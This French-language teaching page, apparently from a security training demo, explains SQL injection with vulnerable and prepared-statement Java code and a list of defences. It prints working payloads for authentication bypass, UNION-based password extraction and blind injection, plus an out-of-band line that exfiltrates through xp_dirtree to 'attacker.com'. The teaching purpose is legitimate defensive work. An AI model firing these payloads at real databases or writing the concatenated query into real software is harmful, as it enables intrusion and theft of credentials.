Qu'est-ce qu'une injection SQL ?

L'injection SQL est une technique d'attaque qui exploite une faille de sécurité dans la couche base de données d'une application. Elle permet à un attaquant d'insérer ou de manipuler des requêtes SQL.

🎯 Dangers :

  • Accès non autorisé aux données sensibles (mots de passe, informations personnelles)
  • Modification ou suppression de données
  • Contournement de l'authentification
  • Exécution de commandes administratives sur la base de données
  • Dans certains cas : exécution de commandes système

💡 Payloads d'attaque classiques :

# Contournement d'authentification Username: admin' OR '1'='1' -- Password: n'importe quoi # Extraction de données Username: admin' UNION SELECT username, password FROM users -- # Commentaires SQL ' OR 1=1 -- ' OR 1=1 # ' OR 1=1 /*

🔓 Version Vulnérable

Essayez : admin' OR '1'='1' --

⚠️ Code vulnérable :

// ❌ VULNÉRABLE - Concaténation directe String query = "SELECT * FROM users WHERE " + "username='" + username + "' " + "AND password='" + password + "'"; // L'entrée utilisateur est directement injectée ! // Pas de validation, pas d'échappement

Avec l'injection : La requête devient :

SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...' -- Tout après -- est commenté -- OR '1'='1' est toujours vrai -- → Authentification contournée !

✅ Version Sécurisée

Essayez la même attaque : elle sera bloquée !

✅ Code sécurisé :

// ✅ SÉCURISÉ - Requêtes préparées PreparedStatement stmt = connection.prepareStatement( "SELECT * FROM users WHERE username = ? AND password = ?" ); stmt.setString(1, username); stmt.setString(2, password); ResultSet rs = stmt.executeQuery();

Protections appliquées :

  • ✅ Requêtes préparées : Les paramètres sont liés séparément
  • ✅ Validation des entrées : Caractères SQL interdits
  • ✅ Échappement automatique : Les caractères spéciaux sont neutralisés
  • ✅ Whitelist : Seuls les caractères alphanumériques autorisés

⚔️ Types d'injections SQL :

1. In-Band SQLi (Classique)

L'attaquant utilise le même canal pour l'injection et la récupération des données.

-- Union-based ' UNION SELECT null, username, password FROM users -- -- Error-based ' AND 1=CONVERT(int, (SELECT @@version)) --

2. Blind SQLi (Aveugle)

L'application ne retourne pas de données directement, l'attaquant déduit les informations.

-- Boolean-based ' AND 1=1 -- (page normale) ' AND 1=2 -- (page différente) -- Time-based ' AND IF(1=1, SLEEP(5), 0) --

3. Out-of-Band SQLi

Les données sont extraites via un canal différent (DNS, HTTP).

-- Exfiltration DNS '; EXEC master..xp_dirtree '\\attacker.com\share' --

🛡️ Défenses contre l'injection SQL :

  • Requêtes préparées (Prepared Statements) - Solution #1
  • Procédures stockées - Si correctement paramétrées
  • ORM (Object-Relational Mapping) - Hibernate, Entity Framework
  • Validation stricte des entrées - Whitelist > Blacklist
  • Échappement des caractères - Fonction d'échappement de la BDD
  • Principe du moindre privilège - Compte BDD avec droits minimaux
  • WAF (Web Application Firewall) - Détection de patterns malveillants
  • Pas de messages d'erreur détaillés - Ne pas exposer la structure SQL
